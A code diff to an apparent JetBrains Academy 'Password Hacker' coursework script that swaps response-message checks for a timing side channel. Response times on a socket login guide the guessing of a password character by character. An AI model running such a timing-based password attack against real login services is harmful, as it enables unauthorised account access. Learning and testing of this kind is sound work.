@@ -3,6 +3,7 @@ Password Hacker project from JetBrains Academy
 """
 
 import argparse
+from datetime import datetime
 import itertools
 import json
 import socket
@@ -42,15 +43,18 @@ def attempt_password(dict_file, char):
             dict_file['password'] = attempt
             new = json.dumps(dict_file)
             h.send(new.encode())
+            start = datetime.now()
             response = json.loads(h.recv(1024).decode())
+            end = datetime.now()
+            difference = end - start
             if response['result'] == 'Connection success!':
                 return dict_file
-            elif response['result'] == 'Wrong password!':
+            elif difference.microseconds < 9999:
                 if len(attempt) > 1:
                     attempt = attempt[:-1]
                 else:
                     attempt = ''
-            elif response['result'] == 'Exception happened during login':
+            elif difference.microseconds > 9999:
                 break
 
 
